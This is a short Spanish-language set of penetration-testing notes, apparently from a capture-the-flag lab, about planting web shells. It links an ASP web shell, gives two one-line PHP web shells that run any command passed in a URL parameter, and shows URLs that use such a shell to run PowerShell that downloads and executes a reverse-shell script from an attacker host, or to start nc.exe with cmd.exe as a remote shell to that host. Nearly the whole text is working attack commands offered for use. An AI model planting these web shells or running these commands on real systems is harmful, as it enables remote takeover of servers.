• WEB SHELL ASP y ASPX: https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.asp


* Web Shell PHP
```
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
```


Desde estas web shell SE PUEDE LLAMAR llamamos a Invoke-Powershell.ps1:

```
http://10.10.10.97:8808/webshell.php?cmd=powershell%20-c%20IEX%20(New-Object%20Net.Webclient).downloadstring(%27http://10.10.14.5/Invoke-PowerShellTcp.ps1%27)
#O BIEN A UN CMD CON NC (LO TENEMOS QUE SUBIR ANTES) → http://10.10.10.97:8808/webshell.php?cmd=nc.exe%20-e%20cmd.exe%2010.10.14.5%20443
```
